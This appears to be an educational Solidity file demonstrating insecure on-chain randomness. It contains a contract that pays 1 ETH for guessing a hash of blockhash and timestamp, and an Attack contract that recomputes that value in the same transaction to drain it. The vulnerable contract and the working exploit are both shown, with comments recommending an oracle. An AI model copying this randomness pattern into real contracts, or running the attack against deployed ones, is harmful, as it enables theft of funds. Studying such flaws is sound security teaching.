// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

/*
Insecure source of randomness
- Vulnerability (source randomness)
  - block.timestamp
  - blockhash
- Contract using insecure randomness
- Hot to exploit

-> One Solution: USE AN ORACLE!

(PS: you can't test this contract with Remix since Remix doesn't have the "blockhash" func; use a local blockchain with Harhat or Ganache)
*/
contract GuessTheRandomNumber {
  constructor() payable {}

  function guess(uint256 _guess) public {
    /// Our current source of randomness -- blockhash and timestamp; your right it seem a legit source of randomness but only for us the mere humans, just know that it's easy for Solidity to access these variable, so by wrinting another smart contract...
    uint256 answer = uint256(
      keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
    );

    /// If the user guess = the random number, we will reward him with 1 ETH
    if (_guess == answer) {
      (bool sent, ) = msg.sender.call{ value: 1 ether }("");
      require(sent, "Failed to send Ether");
    }
  }
}

contract Attack {
  fallback() external payable {}

  receive() external payable {}

  function attack(GuessTheRandomNumber guessTheRandomNumber) public {
    /// We do exaclty what "guess" will do, so the two answer will be equal (yea it's as simple as this 😅)
    uint256 answer = uint256(
      keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
    );

    guessTheRandomNumber.guess(answer); // We submit our answer, and because we do a call these two code execution will be in the exact same blockhash and timestamp, so "guess" will output the same answer as our answer, therefore we win 1 ETH!

    /// NOTE: if you want a real source of randomness USE AN ORACLE! (like Chainlink)
  }
}
